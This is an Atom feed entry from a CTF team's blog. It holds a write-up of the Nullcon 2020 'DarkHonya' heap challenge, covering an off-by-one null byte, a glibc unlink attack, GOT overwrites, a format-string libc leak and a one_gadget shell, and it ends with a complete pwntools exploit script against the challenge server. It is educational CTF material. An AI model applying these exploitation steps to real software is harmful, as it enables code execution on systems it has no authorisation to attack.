<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>TEAMROCKETIST</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://teamrocketist.github.io/"/>
  <updated>2020-02-11T10:53:42.860Z</updated>
  <id>https://teamrocketist.github.io/</id>
  
  <author>
    <name>TEAMROCKETIST</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>[Pwn] Nullcon 2020 - DarkHonya</title>
    <link href="https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-DarkHonya/"/>
    <id>https://teamrocketist.github.io/2020/02/09/Pwn-Nullcon-2020-DarkHonya/</id>
    <published>2020-02-09T17:14:55.000Z</published>
    <updated>2020-02-11T10:53:42.860Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p><strong>Description</strong>:<br>437 Points   </p><p>nc pwn2.ctf.nullcon.net 5002</p><p><a href="https://mega.nz/#!rjZEHaSK!cKlPuwgZAEeYLWNaeLKLin_tQg71R-ew_ghbp9U5V8c" target="_blank" rel="noopener">challenge</a></p><p>5b2f9b7d0b20ae7a694ae61c9de0c204</p><p><a href="https://mega.nz/#!DyRmnQwA!ZlSi4vNo_F9DDxvxTeMIhdOAV-vijn1Q7wlZiLbjZQQ" target="_blank" rel="noopener">libc-2.23.so</a></p><p>8c0d248ea33e6ef17b759fa5d81dda9e</p></blockquote><h3 id="TLDR"><a href="#TLDR" class="headerlink" title="TLDR"></a>TLDR</h3><ul><li>Use <strong>off by one</strong> vulnerability to set next chunk <strong>prev_on_use</strong> bit to zero </li><li>Use <strong>unlink</strong> attack to write a <strong>global addr</strong> to the <strong>global pointer list</strong></li><li>Edit <strong>global pointer</strong> list with <strong>exit_got</strong> and <strong>atoi_got</strong></li><li>Use edit to overwrite <strong>atoi_got</strong> with <strong>printf</strong></li><li>Use <strong>format string</strong> to leak libc</li><li>Edit <strong>exit_got</strong> with onegadget</li></ul><h3 id="Basic-information"><a href="#Basic-information" class="headerlink" title="Basic information"></a>Basic information</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ file challenge</span><br><span class="line">challenge: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, <span class="keyword">for</span> GNU/Linux 2.6.32, BuildID[sha1]=6ea21ef679ff8d18a6bb9d2dc8914f2689871e20, stripped</span><br><span class="line">$ checksec challenge</span><br><span class="line">[*] <span class="string">'/ctf/work/pwn/darkHonya/challenge'</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure><p>As you can see, the program is <strong>64-bit</strong>, <strong>Canary</strong> and <strong>Pie</strong> off, writeable <strong>GOT</strong> and <strong>NX</strong> is enabled.</p><h3 id="Basic-functions"><a href="#Basic-functions" class="headerlink" title="Basic functions"></a>Basic functions</h3><p>There are 4 functions in the program. After some static analysis, the functions can be analysed as follows:</p><p><strong>Name:</strong> Insert a name, data is stored in a global variable<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">insertNameBss_4009FD</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"----- BookStore -----"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"finally! a customer, what is your name?"</span>);</span><br><span class="line">  editString_400830(byte_6020A0);</span><br><span class="line">  <span class="built_in">puts</span>(byte_6020A0);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">"Welcome %s\n"</span>, byte_6020A0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Buy book:</strong> Allocates a chunk of size 0xF8, and records the corresponding chunk pointer in the bss segment (ptr list).<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">buyAbook_40087C</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> result; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">char</span> *v1; <span class="comment">// [rsp+0h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ptr[i]; ++i );</span><br><span class="line">  <span class="keyword">if</span> ( i &gt; <span class="number">15</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Next time bring a bag with you!"</span>);</span><br><span class="line">  v1 = (<span class="keyword">char</span> *)<span class="built_in">malloc</span>(<span class="number">0xF8</span>uLL);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Name of the book?"</span>);</span><br><span class="line">  editString_400830(v1);</span><br><span class="line">  result = i;</span><br><span class="line">  ptr[i] = v1;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Return a book:</strong> releases the allocated memory block according to the specified index.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">__<span class="function">int64 <span class="title">freeBook_40093A</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v1; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Which book do you want to return?"</span>);</span><br><span class="line">  v1 = getInt_4007ED();</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"boy, you cannot return what you dont have!"</span>);</span><br><span class="line">  <span class="built_in">free</span>(ptr[v1]);</span><br><span class="line">  result = v1;</span><br><span class="line">  ptr[v1] = <span class="number">0L</span>L;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><strong>Edit a book:</strong> Read data into the allocated memory according to the specified index and there is a null byte overflow situation here.<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">fastcall <span class="title">edit_4008EC</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = getInt_4007ED();</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">"Writing in the air now?"</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"Name of the book?"</span>);</span><br><span class="line">  <span class="keyword">return</span> (<span class="keyword">unsigned</span> __int64)editString_400830((<span class="keyword">char</span> *)ptr[v2]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>The usual print function is not available.</p><h3 id="Basic-plan"><a href="#Basic-plan" class="headerlink" title="Basic plan"></a>Basic plan</h3><p>Since the program itself has no print function, in order to get libc, our primary purpose is to construct a leak first. The basic idea is as follows:</p><ul><li>Use unlink to modify <strong>ptr[0]</strong> to <strong>&amp;ptr[0]-0x18</strong></li><li>Use editing function to <strong>edit(0)</strong> and overflow ptr[1] to <strong>exit@got</strong> and ptr[2] to <strong>atoi@got</strong></li><li>Use <strong>edit(2)</strong> to modify <strong>atoi@got</strong> to <strong>printf</strong></li><li>Use format-string to leak a libc addr from the stack</li><li>Use <strong>edit(1)</strong> to modify <strong>exit@got</strong> to <strong>one_gadget</strong></li></ul><h3 id="Off-by-one-null-byte-poisoning"><a href="#Off-by-one-null-byte-poisoning" class="headerlink" title="Off by one (null byte poisoning)"></a>Off by one (null byte poisoning)</h3><p>Now the idea with the null byte overflow is to set the <strong>prev_in_use</strong> bit of <strong>chunk B</strong> to zero, this bit is used to determine if the previous chunk is freed, if we free chunk B the <strong>free</strong> function is going to try to unlink <strong>chunk A</strong>, because it thinks its <strong>freed</strong> and present in <strong>doubly linked list</strong>, what defines the <strong>prev</strong> and <strong>next</strong> items in the list are the <strong>bk</strong> and <strong>fd</strong> pointers.</p><h3 id="Understanding-unlink"><a href="#Understanding-unlink" class="headerlink" title="Understanding unlink"></a>Understanding unlink</h3><p>To understand well the unlink macro we need to understand its operations, the source code of unlink:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> unlink(AV, P, BK, FD) &#123;                                            </span></span><br><span class="line">    FD = P-&gt;fd;                                   </span><br><span class="line">    BK = P-&gt;bk;                                   </span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))             </span><br><span class="line">      malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);  </span><br><span class="line">    <span class="keyword">else</span> &#123;                                    </span><br><span class="line">        FD-&gt;bk = BK; <span class="comment">// arbitrary write happens here                                  </span></span><br><span class="line">        BK-&gt;fd = FD; <span class="comment">// arbitrary write happens here                                  </span></span><br><span class="line">        <span class="keyword">if</span> (!in_smallbin_range (P-&gt;size)                      </span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != <span class="literal">NULL</span>, <span class="number">0</span>)) &#123;            </span><br><span class="line">        <span class="keyword">if</span> (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, <span class="number">0</span>)        </span><br><span class="line">        || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, <span class="number">0</span>))    </span><br><span class="line">          malloc_printerr (check_action,                      </span><br><span class="line">                   <span class="string">"corrupted double-linked list (not small)"</span>,    </span><br><span class="line">                   P, AV);                        </span><br><span class="line">            <span class="keyword">if</span> (FD-&gt;fd_nextsize == <span class="literal">NULL</span>) &#123;                    </span><br><span class="line">                <span class="keyword">if</span> (P-&gt;fd_nextsize == P)                      </span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;             </span><br><span class="line">                <span class="keyword">else</span> &#123;                                </span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;                 </span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;                 </span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;                 </span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;                 </span><br><span class="line">                  &#125;                               </span><br><span class="line">              &#125; <span class="keyword">else</span> &#123;                                </span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;             </span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;             </span><br><span class="line">              &#125;                                   </span><br><span class="line">          &#125;                                   </span><br><span class="line">      &#125;                                       </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The operations of <strong>FD-&gt;bk = BK</strong> and <strong>BK-&gt;fd = FD</strong> is what we want to achieve.</p><p>Now taking a simple example, imagine we have 3 chunks. </p><p>Starting with <strong>FD = P-&gt;fd</strong> and <strong>BK = P-&gt;bk</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/vy0TnDr.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/vy0TnDr.png" alt><br></a></p><p>We execute the <strong>FD-&gt;bk=BK</strong> operation:<br><a data-fancybox="gallery" href="https://i.imgur.com/ezrH4lt.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/ezrH4lt.png" alt><br></a><br>And finally the <strong>BK-&gt;fd=FD</strong> operation:<br><a data-fancybox="gallery" href="https://i.imgur.com/2bgPH4V.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/2bgPH4V.png" alt><br></a><br>But there is a security check to bypass:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// fd bk</span></span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (check_action, <span class="string">"corrupted double-linked list"</span>, P, AV);</span><br></pre></td></tr></table></figure><p>We can’t directly use this to modify for example a <strong>GOT</strong> entry but we can bypass this mechanism in a fake way.</p><p>First, we overwrite the FD pointer of nextchunk to fakeFD and the BK pointer of nextchunk to fakeBK, so in order to pass the verification we need:</p><ul><li><code>fakeFD-&gt;bk == P</code> &lt;=&gt; <code>*(fakeFD+0x18) == P</code></li><li><code>fakeBK-&gt;fd == p</code> &lt;=&gt; <code>*(fakeBK+0x10) == P</code></li></ul><p>When the two above restrictions are satisfied, you can enter unlink and perform the following operations:</p><ul><li><code>fakeFD-&gt;bk = fakeBK</code> &lt;=&gt; <code>*(fakeFD + 0x18) = fakeBK</code></li><li><code>fakeBK-&gt;fd = fakeFD</code> &lt;=&gt; <code>*(fakeBK + 0x10) = fakeFD</code></li></ul><p>Since this <strong>fakeFD-&gt;bk</strong> and <strong>fakeBK-&gt;fd</strong> must contain the address of <strong>P</strong> we need to find a place where the address of <strong>P</strong> is located and this place is at <strong>ptr</strong> list. </p><p>If we can <strong>change</strong> one of the pointers stored in the <strong>ptr</strong> list to a <strong>pointer</strong> located in the <strong>bss</strong> segment, we will be able to <strong>edit</strong> the entire list, after that, we just change the values in that list to write <strong>wherever</strong> we want.</p><h3 id="Creating-the-exploit"><a href="#Creating-the-exploit" class="headerlink" title="Creating the exploit"></a>Creating the exploit</h3><p>First we create a chunk A and a chunk B, inside of chunk A we create a fake chunk with size of 0xf1 set chunk B prev_size equal to 0xf0.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(fakefd)+p64(fakebk)+<span class="string">'B'</span>*<span class="number">0xd0</span> +p64(<span class="number">0xf0</span>)) <span class="comment"># create a fake chunk and overwrite prev_in_use</span></span><br></pre></td></tr></table></figure><p>Before the null byte overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/LjRHQvx.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/LjRHQvx.png" alt><br></a><br>After the null byte overflow:<br><a data-fancybox="gallery" href="https://i.imgur.com/moHRqfu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/moHRqfu.png" alt><br></a><br>The prev_size value is to bypass this security check:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>  ( __builtin_expect  ( chunksize ( P )  ! =  prev_size  ( next_chunk ( P )),  <span class="number">0</span> ))       </span><br><span class="line">   malloc_printerr  ( <span class="string">"corrupted size vs. prev_size"</span> );</span><br></pre></td></tr></table></figure></p><p>We can check the first security check of <code>FD-&gt;bk != P || BK-&gt;fd != P</code> by doing this in gdb:<br><a data-fancybox="gallery" href="https://i.imgur.com/OZO3SnC.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/OZO3SnC.png" alt><br></a><br>Lets trigger <strong>unlink</strong> by freeing chunk B:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">free(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>The content of <strong>global ptr</strong> will look like this:<br><a data-fancybox="gallery" href="https://i.imgur.com/lI0RmbD.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/lI0RmbD.png" alt><br></a><br>Now we add got pointers to the list:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x0</span>)*<span class="number">3</span> + p64(<span class="number">0x602188</span>) + p64(elf.got[<span class="string">'exit'</span>]) + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0x602188</span>))</span><br></pre></td></tr></table></figure><p>Overwriting <strong>atoi@got</strong> at index 2 with <strong>printf</strong>:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br></pre></td></tr></table></figure><p>Now that <strong>atoi@got</strong> points to <strong>printf</strong> it no longer converts the input string to integers but we can still use <strong>printf</strong> to select the menu options because the return value of <strong>printf</strong> is the number of bytes printed:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">r.sendline(<span class="string">' '</span>) <span class="comment"># 2 bytes sent so the option selected is 2 which is free</span></span><br><span class="line">r.sendline(<span class="string">'%lx'</span>) <span class="comment"># leak libc with format string</span></span><br><span class="line">r.recvuntil(<span class="string">'Which book do you want to return?\n'</span>)</span><br><span class="line">LEAK = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = LEAK <span class="number">-0x3c4963</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>%LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC_BASE 0x%x'</span>%LIBC)</span><br></pre></td></tr></table></figure><p>Finally we edit <strong>exit@got</strong> with onegadget and we get a shell:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r.sendlineafter(<span class="string">'5) Checkout!\n'</span>,<span class="string">' '</span>*<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>) <span class="comment"># send 1 byte to select edit option</span></span><br><span class="line">r.sendafter(<span class="string">'Name of the book?\n'</span>, p64(LIBC+<span class="number">0x4526a</span>)) <span class="comment">#overwrite exit@got</span></span><br><span class="line">r.sendline(<span class="string">'loool'</span>) <span class="comment"># trigger exit aka one_gadget</span></span><br></pre></td></tr></table></figure><p>The full exploit:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"pwn2.ctf.nullcon.net"</span>, <span class="string">"5002"</span></span><br><span class="line">filename = <span class="string">"./challenge"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line"></span><br><span class="line">GLOBAL = <span class="number">0x6020A0</span></span><br><span class="line">ptr = <span class="number">0x6021A0</span></span><br><span class="line">fakefd = ptr - <span class="number">0x18</span></span><br><span class="line">fakebk = ptr - <span class="number">0x10</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'1'</span>)</span><br><span class="line">    r.sendafter(<span class="string">'Name of the book?\n'</span>, name)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span><span class="params">(index)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'2'</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">'Which book do you want to return?\n'</span>, str(index))  </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(index, name)</span>:</span></span><br><span class="line">    r.sendlineafter(<span class="string">'5) Checkout!\n'</span>, <span class="string">'3'</span>)</span><br><span class="line">    r.sendline(str(index))</span><br><span class="line">    r.sendafter(<span class="string">'Name of the book?\n'</span>, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line">r = getConn()</span><br><span class="line"><span class="comment">#r.interactive()</span></span><br><span class="line"></span><br><span class="line">r.sendafter(<span class="string">'finally! a customer, what is your name?\n'</span>, <span class="string">'A'</span>*<span class="number">0xf8</span>)</span><br><span class="line">add(<span class="string">'A'</span>*<span class="number">8</span>)</span><br><span class="line">add(<span class="string">'B'</span>*<span class="number">8</span>)</span><br><span class="line"><span class="comment">#add('C'*8)</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">    debug([<span class="number">0x400877</span>]) <span class="comment"># 0x400977,0x4008EC</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p64(<span class="number">0</span>)+p64(<span class="number">0xf1</span>)+p64(fakefd)+p64(fakebk)+<span class="string">'B'</span>*<span class="number">0xd0</span> +p64(<span class="number">0xf0</span>))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"><span class="comment">#add('B'*8)</span></span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x0</span>)*<span class="number">3</span> + p64(<span class="number">0x602188</span>) + p64(elf.got[<span class="string">'exit'</span>]) + p64(elf.got[<span class="string">'atoi'</span>]) + p64(<span class="number">0x602188</span>))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>, p64(elf.plt[<span class="string">'printf'</span>]))</span><br><span class="line">r.sendline(<span class="string">' '</span>)</span><br><span class="line">r.sendline(<span class="string">'%lx'</span>)</span><br><span class="line">r.recvuntil(<span class="string">'Which book do you want to return?\n'</span>)</span><br><span class="line">LEAK = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">LIBC = LEAK <span class="number">-0x3c4963</span></span><br><span class="line">log.info(<span class="string">'LEAK 0x%x'</span>%LEAK)</span><br><span class="line">log.info(<span class="string">'LIBC_BASE 0x%x'</span>%LIBC)</span><br><span class="line"></span><br><span class="line">r.sendlineafter(<span class="string">'5) Checkout!\n'</span>,<span class="string">' '</span>*<span class="number">2</span>)</span><br><span class="line">r.sendline(<span class="string">''</span>)</span><br><span class="line">r.sendafter(<span class="string">'Name of the book?\n'</span>, p64(LIBC+<span class="number">0x4526a</span>))</span><br><span class="line">r.sendline(<span class="string">'loool'</span>)</span><br><span class="line"><span class="comment">#r.sendlineafter('5) Checkout!\n', '3')</span></span><br><span class="line"><span class="comment">#free(1)</span></span><br><span class="line"><span class="comment">#add('C'*8)</span></span><br><span class="line">r.interactive()</span><br><span class="line">r.close()</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><ul><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/unlink-zh/</a></li><li><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/" target="_blank" rel="noopener">https://ctf-wiki.github.io/ctf-wiki/pwn/linux/glibc-heap/off_by_one/</a></li></ul><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Description&lt;/strong&gt;:&lt;br&gt;437 Points   &lt;/p&gt;
&lt;p&gt;nc pwn2.ctf.nullcon.net 5002&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://mega.nz/#!rjZEHaS
      
    
    </summary>
    
      <category term="Pwn" scheme="https://teamrocketist.github.io/categories/Pwn/"/>
    
      <category term="x64" scheme="https://teamrocketist.github.io/categories/Pwn/x64/"/>
    
      <category term="Glibc Malloc" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/"/>
    
      <category term="Unlink" scheme="https://teamrocketist.github.io/categories/Pwn/x64/Glibc-Malloc/Unlink/"/>
    
